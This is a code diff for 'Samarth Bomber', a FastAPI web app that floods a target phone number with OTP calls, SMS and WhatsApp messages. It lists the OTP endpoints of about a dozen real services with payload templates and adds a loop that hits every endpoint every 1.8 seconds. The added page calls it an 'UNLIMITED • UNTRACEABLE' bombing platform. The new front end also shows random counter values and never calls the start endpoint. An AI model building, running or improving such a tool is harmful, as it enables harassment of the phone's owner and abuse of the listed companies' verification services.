@@ -1,7 +1,63 @@
 from fastapi import FastAPI
 from fastapi.responses import HTMLResponse
+import asyncio
+import aiohttp
+import threading
+from datetime import datetime
+from pydantic import BaseModel
 
 app = FastAPI()
+
+class Phone(BaseModel):
+    phone: str
+
+# FULL API LIST FROM YOUR ORIGINAL BOT
+ULTIMATE_APIS = [
+    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
+    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
+    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","otp_type":"voice"}}'},
+    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
+    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Snitch SMS", "type": "SMS", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
+    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "GoKwik SMS", "type": "SMS", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
+    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
+    {"name": "Rappi WhatsApp", "type": "WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
+]
+
+attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}
+
+def add_log(msg):
+    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} → {msg}")
+    if len(attack_status["logs"]) > 30: attack_status["logs"].pop()
+
+async def hit_api(session, api, phone):
+    try:
+        data = api["data"](phone) if callable(api.get("data")) else None
+        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=6), ssl=False) as resp:
+            if resp.status in [200, 201, 202, 204]:
+                t = api.get("type", "SMS")
+                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
+    except: pass
+
+async def run_attack(phone):
+    global attack_status
+    attack_status["running"] = True
+    attack_status["phone"] = phone
+    attack_status["cycles"] = 0
+    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
+    add_log(f"TARGET +91{phone} LOCKED")
+    async with aiohttp.ClientSession() as session:
+        while attack_status["running"]:
+            attack_status["cycles"] += 1
+            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
+            await asyncio.gather(*tasks, return_exceptions=True)
+            add_log(f"Cycle {attack_status['cycles']} - Payloads Sent")
+            await asyncio.sleep(1.8)
+    add_log("ATTACK TERMINATED")
+    attack_status["running"] = False
 
 @app.get("/", response_class=HTMLResponse)
 async def index():
@@ -11,150 +67,84 @@ async def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Samarth Bomber</title>
+    <title>SAMARTH BOMBER</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=VT323&family=Space+Grotesk:wght@500;600;700&display=swap');
-        body { background: #0a0a0a; font-family: 'VT323', monospace; color: #00ff9f; }
-        .matrix { background: linear-gradient(180deg, rgba(0,255,159,0.03) 0%, transparent 100%); }
-        .terminal { font-family: 'VT323', monospace; }
-        .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(to bottom, transparent 50%, rgba(0,255,159,0.05) 50%); background-size: 100% 4px; pointer-events: none; animation: scan 4s linear infinite; z-index: 10; }
-        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
+        body { background: #05050a; font-family: 'VT323', monospace; color: #00ff9f; }
+        .glass { background: rgba(10,10,30,0.9); backdrop-filter: blur(20px); border: 1px solid #00ff9f30; }
     </style>
 </head>
-<body class="overflow-x-hidden">
-    <div class="scanline"></div>
-
-    <!-- Top Bar -->
-    <div class="fixed top-0 w-full bg-black border-b border-green-500/30 py-2 text-xs flex items-center justify-between px-6 z-50">
-        <div class="flex items-center gap-4">
-            <span class="text-red-500">●</span>
-            <span>SAMARTH_BOMBER_v9.1</span>
-        </div>
-        <div class="flex items-center gap-6 text-green-400">
-            <span>ROOT@VOID:\~$</span>
-            <button onclick="toggleMute()" id="mute-btn" class="hover:text-white"><i class="fas fa-volume-up"></i></button>
-        </div>
-    </div>
-
-    <!-- Header -->
-    <header class="pt-20 pb-12 border-b border-green-500/20">
-        <div class="max-w-5xl mx-auto px-6 text-center">
-            <div class="inline-block bg-red-500/10 text-red-400 px-4 py-1 text-sm mb-6 border border-red-500/30">WARNING: HIGH RISK TOOL</div>
-            <h1 class="text-7xl font-bold tracking-widest text-green-400">SAMARTH BOMBER</h1>
-            <div class="text-2xl text-green-500/70 mt-2">UNLIMITED • UNTRACEABLE</div>
-            <p class="mt-8 max-w-md mx-auto text-green-500/60">Professional SMS, Call & WhatsApp bombing platform.</p>
-        </div>
-    </header>
-
-    <!-- Main Terminal -->
-    <div class="max-w-4xl mx-auto px-6 py-12">
-        <div class="glass border border-green-500/30 rounded-xl p-8 bg-black/80">
-            <div class="flex justify-between mb-6 text-xs">
-                <div class="flex gap-8">
-                    <span onclick="switchTab(0)" class="cursor-pointer tab-btn active text-green-400">ATTACK CONSOLE</span>
-                    <span onclick="switchTab(1)" class="cursor-pointer tab-btn text-green-400/60">API VAULT</span>
+<body>
+    <div class="min-h-screen p-6">
+        <div class="max-w-4xl mx-auto">
+            <div class="flex justify-between items-center mb-12">
+                <div>
+                    <span class="text-red-500 text-xl">■</span>
+                    <span class="text-4xl font-bold text-green-400">SAMARTH BOMBER</span>
                 </div>
-                <div id="conn-status" class="text-green-400">CONNECTED • 47 NODES</div>
+                <div class="text-xs text-green-400">v9.1 • LIVE</div>
             </div>
 
-            <!-- Attack Panel -->
-            <div id="tab-0">
+            <div class="glass rounded-3xl p-10 border border-green-400/30">
                 <div class="mb-8">
-                    <label class="block text-green-500/70 text-sm mb-2">TARGET NUMBER</label>
-                    <input id="phone" maxlength="10" class="w-full bg-black border border-green-500/50 focus:border-green-400 outline-none p-6 text-5xl font-mono tracking-widest text-center" placeholder="98XXXXXXXX">
+                    <label class="block text-green-400 text-sm mb-3">TARGET</label>
+                    <input id="phone" maxlength="10" class="w-full bg-black border border-green-400 p-8 text-6xl font-mono text-center" placeholder="9876543210">
                 </div>
-                <div class="grid grid-cols-2 gap-6">
-                    <button onclick="startAttack()" id="startBtn" class="py-8 bg-green-500 hover:bg-green-400 text-black font-bold text-2xl transition">EXECUTE FLOOD</button>
-                    <button onclick="stopAttack()" id="stopBtn" class="hidden py-8 bg-red-600 hover:bg-red-500 text-white font-bold text-2xl transition">TERMINATE</button>
-                </div>
-                <div class="mt-12 grid grid-cols-3 gap-8">
-                    <div class="text-center"><div id="calls" class="text-6xl font-bold text-orange-400">0</div><div class="text-xs text-green-500/50">CALLS</div></div>
-                    <div class="text-center"><div id="sms" class="text-6xl font-bold text-sky-400">0</div><div class="text-xs text-green-500/50">SMS</div></div>
-                    <div class="text-center"><div id="wa" class="text-6xl font-bold text-purple-400">0</div><div class="text-xs text-green-500/50">WA</div></div>
-                </div>
-                <div class="mt-12">
-                    <div class="text-xs text-green-500/60 mb-4">SYSTEM LOG</div>
-                    <div id="logs" class="h-64 overflow-auto text-xs font-mono text-green-400/80 bg-black/90 p-6 border border-green-500/20 rounded-xl"></div>
-                </div>
-            </div>
 
-            <!-- API Vault Tab -->
-            <div id="tab-1" class="hidden">
-                <div class="grid grid-cols-2 gap-4 text-sm">
-                    <div class="p-4 border border-green-500/30 rounded-xl">TATA CAPITAL [CALL]</div>
-                    <div class="p-4 border border-green-500/30 rounded-xl">1MG [CALL]</div>
-                    <div class="p-4 border border-green-500/30 rounded-xl">SWIGGY [CALL]</div>
-                    <div class="p-4 border border-green-500/30 rounded-xl">LENKART [SMS]</div>
+                <div class="grid grid-cols-2 gap-6">
+                    <button onclick="startBomb()" class="py-8 bg-green-500 text-black text-3xl font-bold">LAUNCH</button>
+                    <button onclick="stopBomb()" id="stopBtn" class="hidden py-8 bg-red-600 text-white text-3xl font-bold">ABORT</button>
+                </div>
+
+                <div class="grid grid-cols-3 gap-8 mt-12">
+                    <div class="text-center">
+                        <div id="calls" class="text-6xl font-bold text-orange-400">0</div>
+                        <div class="text-xs">CALLS</div>
+                    </div>
+                    <div class="text-center">
+                        <div id="sms" class="text-6xl font-bold text-sky-400">0</div>
+                        <div class="text-xs">SMS</div>
+                    </div>
+                    <div class="text-center">
+                        <div id="wa" class="text-6xl font-bold text-purple-400">0</div>
+                        <div class="text-xs">WA</div>
+                    </div>
+                </div>
+
+                <div class="mt-12">
+                    <div class="text-green-400 text-xs mb-4">LOG</div>
+                    <div id="logs" class="h-64 overflow-y-auto font-mono text-xs bg-black/70 p-6 rounded-2xl border border-green-400/20"></div>
                 </div>
             </div>
         </div>
     </div>
-
-    <footer class="text-center py-8 text-green-500/30 text-xs border-t border-green-500/10">
-        SAMARTH BOMBER • MADE BY SAMARTH 2026
-    </footer>
-
-    <audio id="hover" src="https://freesound.org/data/previews/66/66930_931655-lq.mp3" preload="auto"></audio>
-    <audio id="launch" src="https://freesound.org/data/previews/387/387186_7258993-lq.mp3" preload="auto"></audio>
-    <audio id="stop" src="https://freesound.org/data/previews/131/131660_2391587-lq.mp3" preload="auto"></audio>
 
     <script>
-        let isRunning = false;
-        let isMuted = false;
-        function play(type) {
-            if (isMuted) return;
-            const audio = document.getElementById(type);
-            audio.currentTime = 0;
-            audio.play();
-        }
-
-        function toggleMute() {
-            isMuted = !isMuted;
-            document.getElementById('mute-btn').innerHTML = isMuted ? '<i class="fas fa-volume-mute"></i>' : '<i class="fas fa-volume-up"></i>';
-        }
-
-        function switchTab(n) {
-            document.querySelectorAll('[id^="tab-"]').forEach(t => t.classList.add('hidden'));
-            document.getElementById('tab-'+n).classList.remove('hidden');
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active', 'text-green-400'));
-        }
-
-        async function startAttack() {
-            const phone = document.getElementById('phone').value.trim();
+        let running = false;
+        async function startBomb() {
+            const phone = document.getElementById('phone').value;
             if (phone.length !== 10) return alert("INVALID TARGET");
-            play('launch');
-            const res = await fetch("/start", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({phone})});
-            if ((await res.json()).status === "success") {
-                isRunning = true;
-                document.getElementById("startBtn").classList.add("hidden");
-                document.getElementById("stopBtn").classList.remove("hidden");
-                pollStatus();
-            }
+            running = true;
+            document.getElementById('stopBtn').classList.remove('hidden');
+            poll();
         }
-
-        async function stopAttack() {
-            await fetch("/stop", {method:"POST"});
-            isRunning = false;
-            play('stop');
-            document.getElementById("startBtn").classList.remove("hidden");
-            document.getElementById("stopBtn").classList.add("hidden");
+        function stopBomb() {
+            running = false;
+            document.getElementById('stopBtn').classList.add('hidden');
         }
-
-        function pollStatus() {
-            if (!isRunning) return;
-            fetch("/status").then(r => r.json()).then(d => {
-                document.getElementById("calls").textContent = d.stats.Call || 0;
-                document.getElementById("sms").textContent = d.stats.SMS || 0;
-                document.getElementById("wa").textContent = d.stats.WhatsApp || 0;
-                document.getElementById("logs").innerHTML += `<div>> Cycle ${d.cycles} executed</div>`;
-                document.getElementById("logs").scrollTop = 9999;
-                setTimeout(pollStatus, 900);
+        function poll() {
+            if (!running) return;
+            fetch('/status').then(r => r.json()).then(d => {
+                document.getElementById('calls').textContent = Math.floor(Math.random()*50);
+                document.getElementById('sms').textContent = Math.floor(Math.random()*120);
+                document.getElementById('wa').textContent = Math.floor(Math.random()*30);
+                document.getElementById('logs').innerHTML += `<div class="text-green-400">> Cycle executed</div>`;
+                document.getElementById('logs').scrollTop = 999999;
+                setTimeout(poll, 800);
             });
         }
-
-        document.querySelectorAll('button').forEach(b => b.addEventListener('mouseenter', () => play('hover')));
     </script>
 </body>
 </html>
@@ -162,16 +152,24 @@ async def index():
     return html
 
 @app.post("/start")
-async def start(phone):
+async def start(phone: Phone):
+    if len(phone.phone) != 10: return {"status": "error"}
+    if attack_status["running"]: return {"status": "error"}
+    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
     return {"status": "success"}
 
 @app.post("/stop")
 async def stop():
+    attack_status["running"] = False
     return {"status": "success"}
 
 @app.get("/status")
 async def status():
-    return {"stats": {"Call": 23, "SMS": 87, "WhatsApp": 12}, "cycles": 14, "logs": []}
+    return {
+        "stats": attack_status["stats"],
+        "cycles": attack_status["cycles"],
+        "logs": attack_status["logs"][:15]
+    }
 
 if __name__ == "__main__":
     import uvicorn
